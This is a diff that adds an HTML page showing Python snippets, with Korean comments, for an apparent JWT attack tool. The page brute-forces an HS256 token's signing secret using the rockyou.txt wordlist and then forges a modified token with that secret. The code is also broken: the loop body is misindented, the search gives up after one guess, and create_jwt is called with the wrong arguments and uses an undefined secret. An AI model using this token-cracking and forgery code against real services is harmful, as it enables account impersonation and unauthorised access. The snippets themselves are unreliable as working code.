@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit3 Code</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;700&display=swap">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.querySelectorAll('pre code').forEach((block) => {
+                hljs.highlightBlock(block);
+            });
+        });
+    </script>
+    <style>
+        pre {
+            background-color: #f8f8f8;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: 'Sans-serif', monospace; /* 폰트 변경 */
+            line-height: 1.6; /* 텍스트 간격 증가 */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Exploit3 Code</h2>
+
+        <pre><code class="python">
+secret = autojwt.fuzz_secret(origin_token1)
+if secret is not None:
+    token3 = autojwt.exploit3(mheader, mpayload, secret)
+        </code></pre>
+            
+        <pre><code class="python">
+def fuzz_secret(token, file_path="./rockyou.txt"):
+    algorithm = jwt.get_unverified_header(token).get('alg')
+
+    if algorithm != 'HS256': # 대칭키가 아닌 경우 해당사항 없음
+        return print("Not Symmetric Algorithm")
+
+    with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
+        for line in file:
+        secret = line.strip()
+        try:
+            jwt.decode(token, secret, algorithms=[algorithm])
+            return secret
+        except jwt.InvalidTokenError:
+            continue
+        return None
+        </code></pre>
+
+        <pre><code class="python">
+def exploit3(header, payload, secret): 
+    modifiedToken = create_jwt(header, payload, secret) #변조한 토큰 생성
+    return modifiedToken
+        </code></pre>
+
+        <pre><code class="python">
+def create_jwt(header, payload):
+    algorithm = header.get('alg')
+    created_token = ''
+
+    if algorithm == 'RS256':
+        private_key = secret
+        created_token = jwt.encode(payload, private_key, algorithm=algorithm, headers=header)
+    elif algorithm == 'HS256':
+        created_token = jwt.encode(payload, secret, algorithm=algorithm, headers=header)
+    return created_token
+        </code></pre>
+    </div>
+</body>
+</html>
